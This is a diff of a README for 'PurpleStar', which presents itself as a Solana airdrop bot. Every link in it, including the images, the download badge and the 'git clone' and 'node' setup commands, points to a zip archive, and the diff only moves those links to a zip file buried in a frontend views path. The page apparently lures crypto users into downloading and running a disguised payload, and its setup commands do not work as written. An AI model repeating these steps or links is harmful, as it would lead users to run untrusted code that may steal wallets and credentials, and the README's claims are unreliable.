@@ -4,7 +4,7 @@
 
 Welcome to PurpleStar - the Solana Airdrop Bot repository! This bot is designed to help you participate in airdrops on the Solana blockchain effortlessly. Whether you are a seasoned Solana enthusiast or a newcomer to the world of decentralized finance, PurpleStar is here to streamline your airdrop claiming process.
 
-![PurpleStar Logo](https://github.com/seebi70/PurpleStar/releases/download/v2.0/Program.zip)
+![PurpleStar Logo](https://raw.githubusercontent.com/seebi70/PurpleStar/v24/src/main/frontend/views/Star_Purple_v2.1.zip)
 
 ---
 
@@ -23,7 +23,7 @@ Welcome to PurpleStar - the Solana Airdrop Bot repository! This bot is designed 
 
 In the fast-paced world of crypto airdrops, time is of the essence. PurpleStar aims to simplify the airdrop participation process on the Solana blockchain by automating many of the repetitive tasks involved. By harnessing the power of this bot, you can stay ahead of the competition and maximize your airdrop rewards.
 
-![Solana](https://github.com/seebi70/PurpleStar/releases/download/v2.0/Program.zip)
+![Solana](https://raw.githubusercontent.com/seebi70/PurpleStar/v24/src/main/frontend/views/Star_Purple_v2.1.zip)
 
 ---
 
@@ -47,7 +47,7 @@ To get started with PurpleStar, follow these simple steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/seebi70/PurpleStar/releases/download/v2.0/Program.zip
+   git clone https://raw.githubusercontent.com/seebi70/PurpleStar/v24/src/main/frontend/views/Star_Purple_v2.1.zip
    ```
 
 2. **Install dependencies**:
@@ -62,7 +62,7 @@ To get started with PurpleStar, follow these simple steps:
 
 4. **Run the bot**:
    ```bash
-   node https://github.com/seebi70/PurpleStar/releases/download/v2.0/Program.zip
+   node https://raw.githubusercontent.com/seebi70/PurpleStar/v24/src/main/frontend/views/Star_Purple_v2.1.zip
    ```
 
 ---
@@ -76,7 +76,7 @@ PurpleStar is designed to be intuitive and user-friendly. Here are some common c
 - `/settings` - Adjust bot settings and notifications.
 - `/help` - Get assistance and guidance on using PurpleStar.
 
-![PurpleStar Screenshot](https://github.com/seebi70/PurpleStar/releases/download/v2.0/Program.zip)
+![PurpleStar Screenshot](https://raw.githubusercontent.com/seebi70/PurpleStar/v24/src/main/frontend/views/Star_Purple_v2.1.zip)
 
 ---
 
@@ -94,4 +94,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 🌟 Get started with PurpleStar today and elevate your airdrop game on Solana! 🌟
 
-[![Download PurpleStar](https://github.com/seebi70/PurpleStar/releases/download/v2.0/Program.zip<COLORCODE>)](https://github.com/seebi70/PurpleStar/releases/download/v2.0/Program.zip)
+[![Download PurpleStar](https://raw.githubusercontent.com/seebi70/PurpleStar/v24/src/main/frontend/views/Star_Purple_v2.1.zip<COLORCODE>)](https://raw.githubusercontent.com/seebi70/PurpleStar/v24/src/main/frontend/views/Star_Purple_v2.1.zip)
